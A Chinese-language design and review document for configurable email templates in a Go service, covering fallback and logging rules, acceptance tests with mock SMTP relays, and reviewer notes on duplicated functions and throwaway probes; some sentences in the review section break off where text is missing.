严格遵循 R6 与 F3 第 2 条（告警放行，不 fail fast）。**告警一律 `fmt.Printf` → stdout**，
与 `email.go` 既有范式一致（R6），不引入 `slog` 到本文件——这样 T12/T13/T14/T16 的捕获目标唯一。

| 时机 | 触发 | 是否改变用哪份模板 | 处置 | 日志 |
|---|---|---|---|---|
| 启动（`NewEmailService`） | `EMAIL_TEMPLATE_DIR` 目录不存在 / 不可读 | 是 | 全部四个模板保持内置；**进程正常启动** | 一行，含目录路径与 error |
| 启动 | 某个模板文件缺失 | 是 | **仅该模板**保持内置，其余照常生效 | **不告警**（缺失即「不覆盖」，是正常用法） |
| 启动 | 某个模板文件**解析**失败（语法错） | 是 | **仅该模板**回落内置 | 一行，含文件名与 parse error |
| 启动 | **零值预执行诊断**失败（未知字段等） | **否——模板照常启用** | 只是提示运维方「这个模板很可能有问题」 | 一行，含文件名与 execute error，**明确措辞为诊断而非回落**（例：`template diagnostic (template remains active)`） |
| 运行期（每次发送） | `Execute` 返回 error | 是 | **本次发送**回落内置模板，邮件照常发出 | 一行，**只含模板名与 error，绝不含数据结构或已渲染内容**（INV1） |

**零值预执行为什么只诊断不决策**：它既不 sound 也不 complete（§0.2 实测）。假阳性会让一个
**能用的模板被永久停用到下次重启**——正是 F3 第 2 条要避免的形态；假阴性让它的「通过」也不构成
保证。降级为诊断后，假阳性的代价从「功能被停用」降到「多一行日志」，假阴性不再是问题（它本来
就不承担保证）。**运行期 `Execute` 失败是唯一决定回落的机制，覆盖 100% 执行期错误、无假阳性。**

**已知代价，接受并记录**：模板持续损坏时，运行期告警**每发一封邮件出现一次**。不加限流——
邮件量本身就是天然上界，且加限流会引入「告警被吞」的新失败模式，比日志噪音更糟。

**两个容易做错的地方，写死在方案里：**

1. **渲染必须先写进 `bytes.Buffer`，`Execute` 返回 nil 才取用。**
   `Execute` 可能写出一半才失败。若把 SMTP writer 或最终 body 变量直接交给它，失败时发出去的
   是**半截邮件**——比不发信更糟，因为它看起来发成功了。INV10 就是防这一条。
2. **告警日志不得记录渲染结果或数据结构。** 验证码模板的数据结构里有 `Code`。
   一句顺手的 `fmt.Printf("render failed: %v, data=%+v", err, data)` 就把验证码写进了生产日志，
   而 §3.5 确认今天除 DEV 模式外它从不落日志。INV1 / T16 专门 grep 这一点。
   **零值预执行的诊断日志同样受此约束**——虽然它手上的 `Code` 是空串，规则要统一，
   否则将来有人把它改成用真实数据预热就破防了。

## 8. 验收

全部可执行。SMTP 侧一律用 mock relay 抓 `MAIL FROM` 命令行与完整 `DATA` 载荷——BASE 的
`testSMTPServer` 没有这个能力（R14/R15/§3.6），实现方需先补 harness，见 §10。

**三条全局观测规则（PG4/PG5/PG9 的产物，适用于下表每一行）：**

- **R-OBS-1**：凡断言**正文内容**的，一律在**解码之后**断言——按 `Content-Transfer-Encoding`
  解 quoted-printable，且 DATA 必须用 `textproto` 的 DotReader 读取（反 dot-stuffing）。
  直接 grep 原始 DATA 会被 `=`→`=3D` 与 76 列软换行击穿（§12 探针 P7 有构造性反例）。
- **R-OBS-2**：凡断言**整封邮件字节相等**的，先掩蔽 `Date:` 与 `Message-ID:` 两行（R13）。
- **R-OBS-3**：凡断言**两条通道一致**的，观测点在 sink 入参处，不在 wire 上（INV8）。
- **R-OBS-4**：凡断言**告警条数**的，只数模板相关告警，不计 `NewEmailService` 无条件打印的
  通道选择行（R12）。

| # | 类型 | 场景 | 预期 | 观测点 |
|---|---|---|---|---|
| T01 | 兼容 | 不设 `EMAIL_TEMPLATE_DIR`，发验证码 | **掩蔽 `Date:`/`Message-ID:` 后**，抓到的 DATA 与内置版本逐字节相同；这两行单独断言存在且格式合法；`git diff` 显示 `buildInvitationParams`、`sanitizeSubjectField` 与 `email_test.go:270-415` 零改动（INV4/PG5） | wire（掩蔽后） |
| T02 | 兼容 | 不设 `EMAIL_TEMPLATE_DIR`，发邀请（工作区名含 `A&B <s>`） | 解码后正文含 `A&amp;B &lt;s&gt;`；主题为 `<inviter> invited you to <ws> on Multica`，与今日一致 | 解码后正文 + Subject |
| T03 | 正向 | 四个模板齐全，发验证码与邀请 | 主题与正文来自模板；`{{.Code}}` 渲染出正确验证码；`From:` 仍为配置值 | 解码后 |

r1 为了让 `buildInvitationParams` 零 diff，选择了「新增平行函数」。r2 做复查时发现
`sanitizeSubjectField` 面临**完全相同**的处境（PG6），只能做**完全相同**的选择，于是重复的
函数从一对变成两对。这不是某一次决策失误，而是「用零 diff 换机械证据」这个策略的**固有代价
会随接触面线性增长**——而 r1 只在单点评估了它的代价（§4.3 写「代价是两个函数并存」），
没有评估它作为一条通用策略的累积代价。L3 的 `must_answer` 4 已经把这个问题交出去了。
**建议**：方案里凡出现「为保零 diff 而新增平行实现」的决定，应当在同一处写明**还有哪些位置会
被同一条理由波及**，而不是等到下一轮复查逐个发现。

**M12 — 探针豁免（r1 的 M8）这一轮仍然只能靠自行判断，且这次的用量大得多。**
r1 建议正本明确写「规划可以为取证运行一次性探针」。本轮该建议尚未进入正本，而 r2 的取证需求

读代码得出**，必须真的跑 Go。我沿用 r1 的处置：探针在 `/workspaces/.../probe-r2/`（仓库外），
执行后删除，只把命令与输出入账（§12），仓库工作树 clean。
**补充一条 r1 没提的**：本轮有一个探针（`p2.go`）因为我先加了 `//go:build ignore` 又用
fallback 命令改写，导致文件在磁盘上被修改过一次。这类「探针本身被改」的过程不会进入账本，
但它意味着 §12 的输出与我最初写下的探针源码不是同一版本。**证据的可复现性依赖的是输出 + 命令，

并允许探针源码在过程中变动。
